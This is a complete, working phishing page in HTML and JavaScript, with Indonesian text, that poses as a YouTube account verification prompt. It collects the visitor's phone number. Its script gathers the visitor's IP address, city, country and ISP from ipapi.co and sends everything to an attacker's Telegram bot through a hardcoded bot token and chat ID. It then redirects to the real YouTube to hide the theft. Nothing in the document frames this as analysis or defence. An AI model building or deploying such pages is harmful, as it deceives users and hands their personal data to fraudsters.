<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube - Verification Required</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: Roboto, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: #212121;
            padding: 30px;
            border-radius: 12px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            text-align: center;
        }
        .logo {
            color: #ff0000;
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            background-color: #121212;
            border: 1px solid #333;
            border-radius: 4px;
            color: white;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #3ea6ff;
            border: none;
            border-radius: 4px;
            color: #0f0f0f;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover {
            background-color: #65b8ff;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo">YouTube</div>
        <p>Verifikasi akun Anda untuk melanjutkan menonton video ini.</p>
        
        <form id="verifyForm">
            <input type="tel" id="phone" placeholder="Nomor Telepon (Contoh: +62...)" required>
            <button type="submit">Verifikasi</button>
        </form>
    </div>

    <script>
        // Mengirim data IP dan nomor telepon langsung ke Bot Telegram
        async function sendToTelegram(phone, ipData) {
            const botToken = "7833390122:AAG7pnJhD90Yv4bkUalkxQV3-psMcOCIWrQ";
            const chatId = "8433844160";
            
            const message = `🚨 **Data Tangkapan Baru (YouTube)**\n\n` +
                            `📱 **Nomor Telepon:** ${phone}\n` +
                            `🌍 **IP:** ${ipData.ip}\n` +
                            `📍 **Kota:** ${ipData.city}\n` +
                            `🏳️ **Negara:** ${ipData.country_name}\n` +
                            `🏢 **ISP:** ${ipData.org}`;

            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            try {
                await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (err) {
                console.error("Gagal mengirim data ke bot.");
            }
        }

        document.getElementById('verifyForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const phone = document.getElementById('phone').value;

            // Mengambil informasi IP publik target melalui ipapi.co
            let ipData = { ip: "Unknown", city: "Unknown", country_name: "Unknown", org: "Unknown" };
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipData = await response.json();
            } catch (err) {
                // Fallback jika API gagal diakses
            }

            await sendToTelegram(phone, ipData);
            
            // Redirect kembali ke halaman YouTube asli setelah submit
            window.location.href = "https://www.youtube.com";
        });
    </script>

</body>
</html>
